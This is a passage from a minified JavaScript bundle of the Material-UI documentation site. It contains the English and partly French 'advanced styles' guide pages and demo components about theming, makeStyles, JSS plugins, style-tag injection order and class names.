component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}>\n      {/* 'jss1' */}\n      <span className={classes.label}>{/* 'jss2' nested */}</span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />;\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### `withStyles`\n\nThis is the simplest case. The wrapped component accepts a `classes` prop,\nit simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}>{/* 'jss2 my-label' Nested*/}</span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />;\n}\n```\n\n### `makeStyles`\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}>{/* 'jss2 my-label' nested */}</span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />;\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need,\nand only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of\n[jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl';\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser,\n> as it's one of the key elements to know when overriding styles.\n> You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page.\nThey gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>{/* Your component tree.\n      Styled components can override Material-UI's styles. */}</StylesProvider>;\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root);\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation.\nBy adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build.\nTo get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element.\nTo get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it\u2019s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`.\nRefer to the plugin's page for setup and usage instructions.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles.\nThe non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently.\nWhen the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`.\nFor instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles(\n  {\n    root: {\n      /* \u2026 */\n    },\n    label: {\n      /* \u2026 */\n    },\n    outlined: {\n      /* \u2026 */\n      '&$disabled': {\n        /* \u2026 */\n      },\n    },\n    outlinedPrimary: {\n      /* \u2026 */\n      '&:hover': {\n        /* \u2026 */\n      },\n    },\n    disabled: {},\n  },\n  { name: 'MuiButton' },\n);\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root {\n  /* \u2026 */\n}\n.MuiButton-label {\n  /* \u2026 */\n}\n.MuiButton-outlined {\n  /* \u2026 */\n}\n.MuiButton-outlined.Mui-disabled {\n  /* \u2026 */\n}\n.muibutton-outlinedprimary: {\n  /* \u2026 */\n}\n.MuiButton-outlinedPrimary:hover {\n  /* \u2026 */\n}\n```\n\n_This is a simplification of the `@material-ui/core/Button` component's style sheet._\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the classes prop.\nIt's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset.\nYou can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes.\n[Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n"},"6c61":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return l}));var s=t("mXGw"),o=t("yZEQ"),r=s.createElement,i=Object(o.a)({"@global":{".cssjss-advanced-global-root":{height:100,width:100,backgroundColor:"blue"},".cssjss-advanced-global-child":{height:8,backgroundColor:"red"}}}),a=r("div",{className:"cssjss-advanced-global-root"},r("div",{className:"cssjss-advanced-global-child"}));function l(){return i(),a}},"6iTa":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return g}));var s=t("bZJ2"),o=t("mXGw"),r=t("yZEQ"),i=t("WLtd"),a=t("h7Hf"),l=o.createElement,c=Object(r.a)((function(e){return Object(i.a)({root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:e.boxShadow,color:"white",height:48,padding:"0 30px"}})}));function d(){var e=c();return l("button",{type:"button",className:e.root},"Theme nesting")}var u=l(d,null),m=l("br",null),h=l("br",null),p=l(d,null);function g(){return l("div",null,l(a.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)",boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)"}},u,m,h,l(a.a,{theme:function(e){return Object(s.a)(Object(s.a)({},e),{},{background:"linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)",boxShadow:"0 3px 5px 2px rgba(33, 203, 243, .3)"})}},p)))}},"76xw":function(e,n){e.exports="import * as React from 'react';\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStyles = makeStyles({\n  root: {\n    '&.root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '& .child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function HybridCss() {\n  const classes = useStyles();\n\n  return (\n    <div className={clsx(classes.root, 'root')}>\n      <div className=\"child\" />\n    </div>\n  );\n}\n"},"7HKs":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return c}));var s=t("mXGw"),o=t("yZEQ"),r=t("h7Hf"),i=s.createElement,a=Object(o.a)((function(e){return{root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)",color:"white",height:48,padding:"0 30px"}}}));var l=i(r.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)"}},i((function(){var e=a();return i("button",{type:"button",className:e.root},"Theming")}),null));function c(){return l}},"9SVr":function(e,n,t){"use strict";t.r(n);var s=t("mXGw"),o=t("005G"),r=t("h7Hf"),i=s.createElement;var a=Object(o.a)((function(e){return i("span",null,"spacing ".concat(e.theme.spacing))})),l=i(a,null);n.default=function(){return i(r.a,{theme:{spacing:"8px"}},l)}},BCuL:function(e,n){e.exports="import * as React from 'react';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStyles = makeStyles({\n  '@global': {\n    '.cssjss-advanced-global-root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '.cssjss-advanced-global-child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function GlobalCss() {\n  useStyles();\n\n  return (\n    <div className=\"cssjss-advanced-global-root\">\n      <div className=\"cssjss-advanced-global-child\" />\n    </div>\n  );\n}\n"},EhcO:function(e,n){e.exports="import * as React from 'react';\nimport {\n  ThemeProvider,\n  WithTheme as WithThemeProps,\n  withTheme,\n} from '@material-ui/styles';\n\ninterface Theme {\n  spacing: string;\n}\n\ninterface Props extends WithThemeProps<Theme> {}\n\nfunction DeepChildRaw(props: Props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme<Theme, typeof DeepChildRaw>(DeepChildRaw);\n\nfunction WithTheme() {\n  return (\n    <ThemeProvider\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n\nexport default WithTheme;\n"},F9ty:function(e,n){e.exports="import * as React from 'react';\nimport {\n  ThemeProvider,\n  makeStyles,\n  createStyles,\n} from '@material-ui/core/styles';\n\ninterface MyTheme {\n  background: string;\n  boxShadow: string;\n}\n\nconst useStyles = makeStyles((theme: MyTheme) =>\n  createStyles({\n    root: {\n      background: theme.background,\n      border: 0,\n      fontSize: 16,\n      borderRadius: 3,\n      boxShadow: theme.boxShadow,\n      color: 'white',\n      height: 48,\n      padding: '0 30px',\n    },\n  }),\n);\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theme nesting\n    </button>\n  );\n}\n\nexport default function ThemeNesting() {\n  return (\n    <div>\n      <ThemeProvider<MyTheme>\n        theme={{\n          background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n          boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n        }}\n      >\n        <DeepChild />\n        <br />\n        <br />\n        <ThemeProvider<MyTheme>\n          theme={(outerTheme) => ({\n            ...outerTheme,\n            background: 'linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)',\n            boxShadow: '0 3px 5px 2px rgba(33, 203, 243, .3)',\n          })}\n        >\n          <DeepChild />\n        </ThemeProvider>\n      </ThemeProvider>\n    </div>\n  );\n}\n"},HcJu:function(e,n){e.exports="import * as React from 'react';\nimport styled from 'styled-components';\nimport { TextField, NoSsr } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n` as typeof TextField;\n\nexport default function GlobalClassName() {\n  return (\n    <NoSsr>\n      <StyledTextField\n        label=\"Deterministic\"\n        variant=\"outlined\"\n        id=\"deterministic-outlined-input\"\n      />\n    </NoSsr>\n  );\n}\n"},I5QN:function(e,n){e.exports="import * as React from 'react';\nimport { ThemeProvider, makeStyles } from '@material-ui/core/styles';\n\nconst useStyles = makeStyles((theme) => ({\n  root: {\n    background: theme.background,\n    border: 0,\n    fontSize: 16,\n    borderRadius: 3,\n    boxShadow: theme.boxShadow,\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n}));\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theme nesting\n    </button>\n  );\n}\n\nexport default function ThemeNesting() {\n  return (\n    <div>\n      <ThemeProvider\n        theme={{\n          background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n          boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n        }}\n      >\n        <DeepChild />\n        <br />\n        <br />\n        <ThemeProvider\n          theme={(outerTheme) => ({\n            ...outerTheme,\n            background: 'linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)',\n            boxShadow: '0 3px 5px 2px rgba(33, 203, 243, .3)',\n          })}\n        >\n          <DeepChild />\n        </ThemeProvider>\n      </ThemeProvider>\n    </div>\n  );\n}\n"},IbKh:function(e,n,t){var s={"./GlobalClassName.js":"W1Q1","./GlobalClassName.tsx":"HcJu","./GlobalCss.js":"BCuL","./GlobalCss.tsx":"Jc26","./HybridGlobalCss.js":"aUig","./HybridGlobalCss.tsx":"76xw","./StringTemplates.js":"kr92","./ThemeNesting.js":"I5QN","./ThemeNesting.tsx":"F9ty","./Theming.js":"/+Qa","./Theming.tsx":"ehgw","./UseTheme.js":"RuvM","./UseTheme.tsx":"hDXk","./WithTheme.js":"Rsxw","./WithTheme.tsx":"EhcO","./advanced-de.md":"Scow","./advanced-es.md":"dg2h","./advanced-fr.md":"PdoK","./advanced-ja.md":"rwG6","./advanced-pt.md":"g9mt","./advanced-ru.md":"QW0H","./advanced-zh.md":"/aAU","./advanced.md":"4lnC"};function o(e){var n=r(e);return t(n)}function r(e){if(!t.o(s,e)){var n=new Error("Cannot find module '"+e+"'");throw n.code="MODULE_NOT_FOUND",n}return s[e]}o.keys=function(){return Object.keys(s)},o.resolve=r,e.exports=o,o.id="IbKh"},Jc26:function(e,n){e.exports="import * as React from 'react';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStyles = makeStyles({\n  '@global': {\n    '.cssjss-advanced-global-root': {\n      height: 100,\n      width: 100,\n      backgroundColor: 'blue',\n    },\n    '.cssjss-advanced-global-child': {\n      height: 8,\n      backgroundColor: 'red',\n    },\n  },\n});\n\nexport default function GlobalCss() {\n  useStyles();\n\n  return (\n    <div className=\"cssjss-advanced-global-root\">\n      <div className=\"cssjss-advanced-global-child\" />\n    </div>\n  );\n}\n"},K8BI:function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return c}));var s=t("mXGw"),o=t("yZEQ"),r=t("h7Hf"),i=s.createElement,a=Object(o.a)((function(e){return{root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)",color:"white",height:48,padding:"0 30px"}}}));var l=i(r.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)"}},i((function(){var e=a();return i("button",{type:"button",className:e.root},"Theming")}),null));function c(){return l}},NLUw:function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return m}));var s=t("kGIj"),o=t("mXGw"),r=t("UutA"),i=t("nx5Z"),a=t("WKBU"),l=o.createElement;function c(){var e=Object(s.a)(["\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n"]);return c=function(){return e},e}var d=Object(r.b)(i.a)(c()),u=l(a.a,null,l(d,{label:"Deterministic",variant:"outlined",id:"deterministic-outlined-input"}));function m(){return u}},PdoK:function(e,n){e.exports="# Avanc\xe9\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/core/styles.</p>\n\n## Th\xe8me\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Then, you can access the theme object in style functions.\n\n> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Acc\xe9der au th\xe8me dans un composant\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\nFor use in function components:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Theme nesting\n\nVous pouvez imbriquer plusieurs fournisseurs de th\xe8me. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nLe th\xe8me int\xe9rieur **remplacera** le th\xe8me ext\xe9rieur. Vous pouvez \xe9tendre le th\xe8me externe en fournissant une fonction :\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### `withStyles`\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from 